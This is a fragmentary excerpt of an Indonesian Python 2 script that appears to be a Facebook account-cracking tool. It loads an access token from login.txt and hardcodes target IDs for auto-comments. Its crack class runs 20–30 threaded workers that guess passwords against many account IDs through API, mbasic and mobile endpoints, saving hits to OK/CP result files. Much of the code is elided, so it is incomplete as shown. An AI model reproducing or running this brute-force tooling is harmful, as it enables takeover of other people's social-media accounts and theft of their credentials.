...
def awokawokawokawokawokawokawokawokawokawokawokawok():
		...
		os.system("cat login.txt")
            ...
            print '\n %s[%s×%s]Menu [%s%s%s] Ini Tidak Terdaftar !!'%(N,M,N,M,yan,N);time.sleep(1);os.system('clear');daniezz_xd()
def kontol():
	try:
		__cindy__ = open('login.txt', 'r').read()
		token = open('login.txt', 'r').read()
	...
	srghun = '100014926689370'
	fdrffg = '1212330252607853'
	kom3 = "Semoga Abang @[100014926689370:0] Panjang Umur Amin !!"
	fdrffg2 = '1212330252607853'
	vyhbhj = 'ANGRY'
...
Github    	: github.com/DaniezzXD""")));time.sleep(0.3)
    print 25 * "--"+"\n"
    jalan(i+"Donasi Ngab :)")
...
class __crack__:
    ...
    def slurr(self):
        ...
        ___daniezzganteng___ = raw_input(' [%s?%s]Password Manual Atau Otomatis [m/O]: '%(O,N))
        if ___daniezzganteng___ in ('M', 'm'):
                        ...
                        if cin == '':
                            ...
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        ...
                                        __daniezzXD__.submit(self.__api__, kimochi, ysc)
                                    except:
                                        pass
                            ...
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __daniezzXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except:
                                        pass
...
#                            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
                            ...
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __daniezzXD__.submit(self.__mfb__, kimochi, ysc)
                                    except:
                                        pass
...
#                            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
        ...
        elif ___daniezzganteng___ in ('O', 'o'):
            print '\n [ Method Yang Tersedia !! ]\n'
            print ' [%s1%s]Method API ( FAST )'%(O,N)
            print ' [%s2%s]Method mbasic ( SLOW )'%(O,N)
            print ' [%s3%s]Method ( SUPER SLOW )'%(O,N)
...
#        print '\r [%s%s%s] crack: %s/%s OK-:%s - CP-:%s '%(O,datetime.now().strftime('%H:%M:%S'),N,loop,len(self.id),len(ok),len(cp)),
    ...
    def __pler__(self):
        ...
        if yan == '':
            ...
            print ' [%s+%s]Hasil Crack CP DiSimpan Di -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s]Hidupkan Mode Pesawat Jika Mau Jeda/Pause Crack :)'%(M,N)
            with DaniezzGanteng(max_workers=20) as (__yayanXD__):
                for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        __daniezzXD__.submit(self.__api__, bb[0], raimuuu)
                    except:
                        pass
            ...
            with YayanGanteng(max_workers=20) as (__yayanXD__):
                for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        __daniezzXD__.submit(self.__mfb__, bb[0], raimuuu)
                    except:
                        pass
